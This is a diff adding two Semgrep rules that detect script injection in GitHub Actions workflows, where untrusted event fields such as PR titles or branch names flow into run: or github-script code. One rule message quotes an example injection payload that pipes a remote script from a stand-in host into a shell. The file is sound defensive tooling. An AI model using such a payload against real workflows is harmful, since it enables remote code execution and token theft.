@@ -1,0 +1,69 @@
+# NOTE: the two $SCRIPT regexes below are intentionally identical. They are kept in
+# sync by tests/test_rules_in_sync.py. Anatomy:
+#
+#   (?is).*?\$\{\{         start of an expression, anywhere in the (multi-line) string; (?i) because
+#                          GitHub expressions are case-insensitive (`GitHub.Head_Ref` works)
+#   (?:(?!\}\}).)*?        any chars that do not cross the closing `}}` (so a `}` inside
+#                          format('{0}', ...) does not end the search early)
+#   \b(?:<untrusted ctx>)\b
+#
+# "Untrusted" = values an outside contributor can set without write access to the repo:
+# issue/PR/discussion titles and bodies, comment/review bodies, head branch names and
+# labels, commit messages and author names/emails, wiki page names.
+rules:
+  - id: gha-script-injection-run
+    languages: [yaml]
+    severity: ERROR
+    message: >-
+      Attacker-controllable value `${{ ... }}` is interpolated directly into a `run:` script.
+      GitHub expands expressions *before* the shell parses the script, so a PR title like
+      `"; curl evil.sh | sh #` becomes code. Pass the value through an environment variable
+      (`env: TITLE: ${{ ... }}`) and reference it as `"$TITLE"` instead.
+    metadata:
+      category: security
+      cwe: "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+      references:
+        - https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
+        - https://securitylab.github.com/resources/github-actions-untrusted-input/
+      confidence: HIGH
+      impact: HIGH
+    patterns:
+      - pattern-inside: |
+          steps:
+            ...
+      - pattern: |
+          run: $SCRIPT
+      - metavariable-regex:
+          metavariable: $SCRIPT
+          regex: >-
+            (?is).*?\$\{\{(?:(?!\}\}).)*?(?<!contains\()(?<!contains\( )(?<!startsWith\()(?<!startsWith\( )(?<!endsWith\()(?<!endsWith\( )(?<!contains\(toJSON\()(?<!contains\(toJson\()(?<!contains\(fromJSON\()(?<!contains\(fromJson\()\b(?:github\.event\.(?:issue|pull_request|discussion)\.(?:title|body)|github\.event\.(?:comment|review|review_comment)\.body|github\.event\.pull_request\.head\.(?:ref|label)|github\.event\.pull_request\.head\.repo\.(?:default_branch|description|homepage)|github\.event\.pages(?:\.\*|\[[^\]]*\])\.page_name|github\.event\.commits(?:\.\*|\[[^\]]*\])\.(?:message|author\.(?:email|name))|github\.event\.head_commit\.(?:message|author\.(?:email|name))|github\.event\.workflow_run\.(?:head_branch|display_title|head_commit\.(?:message|author\.(?:email|name))|head_repository\.description|pull_requests(?:\.\*|\[[^\]]*\])\.head\.ref)|github\.head_ref)\b(?!\s*[!=]=)
+
+  - id: gha-script-injection-github-script
+    languages: [yaml]
+    severity: ERROR
+    message: >-
+      Attacker-controllable value `${{ ... }}` is interpolated into the `script:` of
+      actions/github-script. The expression is substituted into the JavaScript *source*
+      before it runs, so a crafted title/branch name can break out of the string literal
+      and execute arbitrary JS with the workflow's token. Read the value from
+      `process.env` (set via `env:`) or from `context.payload` instead.
+    metadata:
+      category: security
+      cwe: "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+      references:
+        - https://securitylab.github.com/resources/github-actions-untrusted-input/
+      confidence: HIGH
+      impact: HIGH
+    patterns:
+      - pattern-inside: |
+          - uses: $ACTION
+            ...
+      - metavariable-regex:
+          metavariable: $ACTION
+          regex: ^actions/github-script(@.*)?$
+      - pattern: |
+          script: $SCRIPT
+      - metavariable-regex:
+          metavariable: $SCRIPT
+          regex: >-
+            (?is).*?\$\{\{(?:(?!\}\}).)*?(?<!contains\()(?<!contains\( )(?<!startsWith\()(?<!startsWith\( )(?<!endsWith\()(?<!endsWith\( )(?<!contains\(toJSON\()(?<!contains\(toJson\()(?<!contains\(fromJSON\()(?<!contains\(fromJson\()\b(?:github\.event\.(?:issue|pull_request|discussion)\.(?:title|body)|github\.event\.(?:comment|review|review_comment)\.body|github\.event\.pull_request\.head\.(?:ref|label)|github\.event\.pull_request\.head\.repo\.(?:default_branch|description|homepage)|github\.event\.pages(?:\.\*|\[[^\]]*\])\.page_name|github\.event\.commits(?:\.\*|\[[^\]]*\])\.(?:message|author\.(?:email|name))|github\.event\.head_commit\.(?:message|author\.(?:email|name))|github\.event\.workflow_run\.(?:head_branch|display_title|head_commit\.(?:message|author\.(?:email|name))|head_repository\.description|pull_requests(?:\.\*|\[[^\]]*\])\.head\.ref)|github\.head_ref)\b(?!\s*[!=]=)
